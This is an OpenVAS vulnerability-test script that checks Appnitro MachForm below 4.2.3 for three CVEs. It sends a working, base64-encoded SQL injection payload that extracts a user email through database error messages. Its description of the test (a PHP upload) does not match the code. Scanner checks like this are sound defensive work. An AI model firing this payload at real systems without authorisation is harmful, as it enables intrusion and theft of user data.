###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_machform_mult_vuln.nasl 12368 2018-11-16 03:53:29Z ckuersteiner $
#
# Appnitro MachForm < 4.2.3 Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:appnitro:machform";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141126");
  script_version("$Revision: 12368 $");
  script_tag(name:"last_modification", value:"$Date: 2018-11-16 04:53:29 +0100 (Fri, 16 Nov 2018) $");
  script_tag(name:"creation_date", value:"2018-05-31 09:43:14 +0700 (Thu, 31 May 2018)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2018-6409", "CVE-2018-6410", "CVE-2018-6411");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Appnitro MachForm < 4.2.3 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_appnitro_machform_detect.nasl");
  script_mandatory_keys("appnitro_machform/installed");

  script_tag(name:"summary", value:"Appnitro MachForm is prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"Appnitro MachForm is prone to multiple vulnerabilities:

  - Path traversal (CVE-2018-6409)

  - SQL-Injection (CVE-2018-6410)

  - Bypass of file upload filter (CVE-2018-6411)");

  script_tag(name:"vuldetect", value:"Tries to upload a PHP file and checks if phpinfo() can be exectuted.");

  script_tag(name:"solution", value:"Update to version 4.2.3 or later");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/44794/");
  script_xref(name:"URL", value:"https://metalamin.github.io/MachForm-not-0-day-EN/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/download.php?q=ZWw9IChTRUxFQ1QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHgyMDIwLChTRUxFQ1QgTUlEKCh1c2VyX2VtYWlsKSwxLDUwKSBGUk9NIGFwX3VzZXJzIE9SREVSIEJZIHVzZXJfaWQgTElNSVQgMCwxKSwweDIwMjAsRkxPT1IoUkFORCgwKSoyKSl4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLkNIQVJBQ1RFUl9TRVRTIEdST1VQIEJZIHgpYSkgOyZpZD0xJmhhc2g9MSZmb3JtX2lkPTE=';

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if ("Integrity constraint violation" >< res) {
  report = 'The error message retrieved indicates that an SQL Injection was possible.\n\nResponse:\n' +
           res;
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
